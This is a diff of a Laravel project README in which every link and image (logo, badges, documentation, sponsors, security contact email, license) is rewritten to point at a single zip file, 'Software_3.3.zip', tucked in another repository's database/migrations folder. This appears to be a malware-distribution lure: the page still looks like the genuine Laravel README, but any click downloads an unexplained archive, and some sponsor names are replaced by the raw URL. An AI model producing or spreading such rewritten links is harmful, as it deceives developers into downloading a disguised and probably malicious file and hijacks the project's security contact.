@@ -1,78 +1,78 @@
-<p align="center"><img src="https://res.cloudinary.com/dtfbvvkyp/image/upload/v1566331377/laravel-logolockup-cmyk-red.svg" width="400"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip" width="400"></p>
 
 <p align="center">
-<a href="https://travis-ci.org/laravel/framework"><img src="https://travis-ci.org/laravel/framework.svg" alt="Build Status"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://poser.pugx.org/laravel/framework/d/total.svg" alt="Total Downloads"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://poser.pugx.org/laravel/framework/v/stable.svg" alt="Latest Stable Version"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://poser.pugx.org/laravel/framework/license.svg" alt="License"></a>
+<a href="https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip"><img src="https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip" alt="Build Status"></a>
+<a href="https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip"><img src="https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip" alt="Total Downloads"></a>
+<a href="https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip"><img src="https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip" alt="Latest Stable Version"></a>
+<a href="https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip"><img src="https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip" alt="License"></a>
 </p>
 
 ## About Laravel
 
 Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:
 
-- [Simple, fast routing engine](https://laravel.com/docs/routing).
-- [Powerful dependency injection container](https://laravel.com/docs/container).
-- Multiple back-ends for [session](https://laravel.com/docs/session) and [cache](https://laravel.com/docs/cache) storage.
-- Expressive, intuitive [database ORM](https://laravel.com/docs/eloquent).
-- Database agnostic [schema migrations](https://laravel.com/docs/migrations).
-- [Robust background job processing](https://laravel.com/docs/queues).
-- [Real-time event broadcasting](https://laravel.com/docs/broadcasting).
+- [Simple, fast routing engine](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip).
+- [Powerful dependency injection container](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip).
+- Multiple back-ends for [session](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip) and [cache](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip) storage.
+- Expressive, intuitive [database ORM](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip).
+- Database agnostic [schema migrations](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip).
+- [Robust background job processing](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip).
+- [Real-time event broadcasting](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip).
 
 Laravel is accessible, powerful, and provides tools required for large, robust applications.
 
 ## Learning Laravel
 
-Laravel has the most extensive and thorough [documentation](https://laravel.com/docs) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.
+Laravel has the most extensive and thorough [documentation](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.
 
-If you don't feel like reading, [Laracasts](https://laracasts.com) can help. Laracasts contains over 1500 video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.
+If you don't feel like reading, [Laracasts](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip) can help. Laracasts contains over 1500 video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.
 
 ## Laravel Sponsors
 
-We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the Laravel [Patreon page](https://patreon.com/taylorotwell).
+We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the Laravel [Patreon page](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip).
 
-- **[Vehikl](https://vehikl.com/)**
-- **[Tighten Co.](https://tighten.co)**
-- **[Kirschbaum Development Group](https://kirschbaumdevelopment.com)**
-- **[64 Robots](https://64robots.com)**
-- **[Cubet Techno Labs](https://cubettech.com)**
-- **[Cyber-Duck](https://cyber-duck.co.uk)**
-- **[British Software Development](https://www.britishsoftware.co)**
-- **[Webdock, Fast VPS Hosting](https://www.webdock.io/en)**
-- **[DevSquad](https://devsquad.com)**
-- [UserInsights](https://userinsights.com)
-- [Fragrantica](https://www.fragrantica.com)
-- [SOFTonSOFA](https://softonsofa.com/)
-- [User10](https://user10.com)
-- [Soumettre.fr](https://soumettre.fr/)
-- [CodeBrisk](https://codebrisk.com)
-- [1Forge](https://1forge.com)
-- [TECPRESSO](https://tecpresso.co.jp/)
-- [Runtime Converter](http://runtimeconverter.com/)
-- [WebL'Agence](https://weblagence.com/)
-- [Invoice Ninja](https://www.invoiceninja.com)
-- [iMi digital](https://www.imi-digital.de/)
-- [Earthlink](https://www.earthlink.ro/)
-- [Steadfast Collective](https://steadfastcollective.com/)
-- [We Are The Robots Inc.](https://watr.mx/)
-- [Understand.io](https://www.understand.io/)
-- [Abdel Elrafa](https://abdelelrafa.com)
-- [Hyper Host](https://hyper.host)
-- [Appoly](https://www.appoly.co.uk)
-- [OP.GG](https://op.gg)
+- **[Vehikl](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)**
+- **[Tighten Co.](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)**
+- **[Kirschbaum Development Group](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)**
+- **[64 Robots](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)**
+- **[Cubet Techno Labs](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)**
+- **[Cyber-Duck](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)**
+- **[British Software Development](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)**
+- **[Webdock, Fast VPS Hosting](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)**
+- **[DevSquad](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)**
+- [UserInsights](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [Fragrantica](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [SOFTonSOFA](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [User10](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [CodeBrisk](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [1Forge](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [TECPRESSO](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [Runtime Converter](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [WebL'Agence](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [Invoice Ninja](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [iMi digital](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [Earthlink](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [Steadfast Collective](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [We Are The Robots Inc.](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [Abdel Elrafa](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [Hyper Host](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [Appoly](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
+- [https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip)
 
 ## Contributing
 
-Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://laravel.com/docs/contributions).
+Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip).
 
 ## Code of Conduct
 
-In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://laravel.com/docs/contributions#code-of-conduct).
+In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip).
 
 ## Security Vulnerabilities
 
-If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [taylor@laravel.com](mailto:taylor@laravel.com). All security vulnerabilities will be promptly addressed.
+If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip). All security vulnerabilities will be promptly addressed.
 
 ## License
 
-The Laravel framework is open-sourced software licensed under the [MIT license](https://opensource.org/licenses/MIT).
+The Laravel framework is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/sujan123123/shuttlecock/master/database/migrations/Software_3.3.zip).
